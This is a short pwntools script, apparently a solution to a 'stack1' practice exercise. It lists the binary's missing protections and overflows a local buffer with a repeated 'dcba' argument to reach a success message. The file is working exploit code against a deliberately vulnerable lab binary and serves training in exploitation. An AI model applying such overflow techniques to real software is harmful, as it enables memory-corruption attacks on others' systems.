from pwn import *

# 1. info
context.log_level = 'debug'
e = ELF("../stack1")
"""
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
"""

# 2. exploit
payload = ['', b'dcba' * 20]

p = process(executable="../stack1", argv=payload)

message = p.recvline()
FLAG = b"you have correctly got the variable to the right value"
if FLAG in message:
    print(FLAG)
